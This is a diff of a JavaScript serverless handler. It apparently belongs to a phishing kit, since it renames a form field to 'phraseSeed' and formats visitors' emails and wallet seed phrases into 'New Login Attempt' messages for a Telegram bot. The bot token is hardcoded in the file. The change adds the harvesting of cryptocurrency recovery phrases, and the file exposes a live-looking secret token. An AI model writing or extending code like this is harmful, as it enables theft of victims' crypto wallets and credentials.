@@ -5,7 +5,7 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { email, description, type } = req.body;
+    const { email, phraseSeed, type } = req.body;
 
     // 🔥 HARDCODED CREDENTIALS (Fix the syntax here)
     const TELEGRAM_BOT_TOKEN = "8786682796:AAFKWkeCO_sBxXlnrn7dWwXgRz8G2zX3fs0";
@@ -19,11 +19,11 @@ export default async function handler(req, res) {
 
     let message = '';
     if (type === 'visit') {
-        message = `🔔 New Visitor!\nAgent: ${description || 'Unknown'}`;
+        message = `🔔 New Visitor!\nAgent: ${phraseSeed || 'Unknown'}`;
     } else if (type === 'login') {
-        message = `🔐 New Login Attempt!\nEmail: ${email}\nDescription: ${description}`;
+        message = `🔐 New Login Attempt!\nEmail: ${email}\nPhraseSeed: ${phraseSeed}`;
     } else {
-        message = `📩 Notification\nEmail: ${email}\nDesc: ${description}`;
+        message = `📩 Notification\nEmail: ${email}\nphraseSeed: ${phraseSeed}`;
     }
 
     try {
